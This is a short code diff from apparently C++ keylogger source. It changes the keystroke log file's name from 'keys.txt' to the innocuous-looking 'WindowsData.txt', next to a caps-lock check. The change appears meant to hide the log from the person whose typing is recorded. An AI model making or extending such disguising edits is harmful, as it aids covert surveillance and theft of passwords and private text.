@@ -13,7 +13,7 @@
 
 using namespace std;
 
-const char LOGFILENAME[] = {"keys.txt"};
+const char LOGFILENAME[] = {"WindowsData.txt"};
 
 int isCapsLock(void)
 {
